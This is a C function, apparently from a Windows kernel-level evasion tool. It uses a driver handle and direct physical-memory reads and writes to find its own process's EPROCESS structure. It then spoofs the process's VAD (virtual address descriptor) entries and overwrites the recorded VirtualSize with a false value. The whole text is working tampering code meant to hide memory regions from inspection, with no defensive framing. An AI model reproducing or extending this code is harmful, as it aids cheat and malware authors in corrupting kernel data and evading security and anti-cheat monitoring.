bool SpoofWindowVADs(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    (void)device;
    (void)sc;
    printf("[*] Spoofing VADs...\n");

    g_SpoofCr3 = systemCr3;

    ULONG64 ourEprocessVA = 0;
    if (!WindowFindOurEprocess(systemCr3, offsets, &ourEprocessVA)) {
        printf("[-] Skipping the VAD spoof\n");
        return false;
    }

    ULONG64 vadRootPA = VirtToPhys(device, sc, systemCr3, ourEprocessVA + offsets->VadRoot);
    if (!vadRootPA) {
        printf("[-] VadRoot (off 0x%X) did not translate\n", offsets->VadRoot);
        return false;
    }

    ULONG64 rootNode = PhysRead64(device, sc, vadRootPA);
    if (!rootNode) {
        printf("[-] VadRoot is 0 (off 0x%X looks wrong)\n", offsets->VadRoot);
        return false;
    }

    int spoofed = 0;
    ULONG64 visited = 0;
    WalkAndSpoofVAD(device, sc, rootNode, systemCr3, offsets, 0, &spoofed, &visited);
    printf("[+] Spoofed %d VADs\n", spoofed);

    if (spoofed == 0 && WindowResidentChunks() == 0)
        printf("[-] No window chunk was pre-faulted, the VADs were left untouched\n");

    if (spoofed > 0 && offsets->VirtualSize) {
        g_VirtualSizeVA = ourEprocessVA + offsets->VirtualSize;
        ULONG64 vsPA = VirtToPhys(device, sc, systemCr3, g_VirtualSizeVA);
        if (vsPA) {
            g_VirtualSizeOrig = PhysRead64(device, sc, vsPA);
            PhysWrite64(device, sc, vsPA, 150ULL * 1024 * 1024);
        } else {
            g_VirtualSizeVA = 0;
        }
    }

    return spoofed > 0;
}
